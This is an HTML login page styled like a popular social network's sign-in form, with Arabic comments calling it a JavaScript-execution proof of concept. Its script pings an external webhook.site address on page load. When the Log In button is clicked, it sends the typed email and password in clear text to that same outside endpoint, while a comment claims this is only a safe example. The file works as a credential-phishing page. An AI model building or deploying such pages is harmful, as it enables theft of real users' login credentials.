<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Login</title>
<style>
    body {
        background: #f0f2f5;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .login-box {
        background: #fff;
        padding: 30px;
        width: 320px;
        border-radius: 12px;
        box-shadow: 0 5px 25px rgba(0,0,0,0.15);
        text-align: center;
    }

    .login-box h2 {
        margin-bottom: 20px;
        color: #333;
    }

    .input {
        width: 90%;
        padding: 10px;
        margin-bottom: 10px;
        border-radius: 6px;
        border: 1px solid #ccc;
        font-size: 15px;
    }

    .btn {
        width: 95%;
        padding: 10px;
        background: #1877f2;
        border: none;
        border-radius: 6px;
        color: white;
        cursor: pointer;
        margin-top: 10px;
        font-size: 16px;
    }

    .poc-message {
        margin-top: 20px;
        color: green;
        font-weight: bold;
    }
</style>
</head>

<body>

<div class="login-box">
    <h2>Login</h2>
    <input id="email" class="input" placeholder="Email or phone">
    <input id="password" class="input" type="password" placeholder="Password">
    <button id="loginBtn" class="btn">Log In</button>

    <div id="poc"></div>
</div>

<script>
// Proof of JS Execution عند تحميل الصفحة
fetch("https://webhook.site/c058809d-2682-46ff-8600-1ec7c750d05a?executed=1&ui=login_poc")
    .catch(()=>{});

document.getElementById("poc").innerHTML =
    "<p class='poc-message'>JavaScript Executed Successfully ✔</p>";

console.log("JS EXECUTED (LOGIN POC)");

// عند الضغط على زر Log In، نرسل بيانات الـ inputs (أمثلة فقط) للـ webhook
document.getElementById("loginBtn").addEventListener("click", function(){
    const emailVal = document.getElementById("email").value;
    const passVal = document.getElementById("password").value;

    // إرسال البيانات للـ webhook (آمن → فقط مثال)
    fetch(`https://webhook.site/c058809d-2682-46ff-8600-1ec7c750d05a?email=${encodeURIComponent(emailVal)}&pass=${encodeURIComponent(passVal)}`)
        .catch(()=>{});

    // Feedback بصري
    document.getElementById("poc").innerHTML =
        "<p class='poc-message'>Data sent to webhook ✔</p>";
});
</script>

</body>
</html>
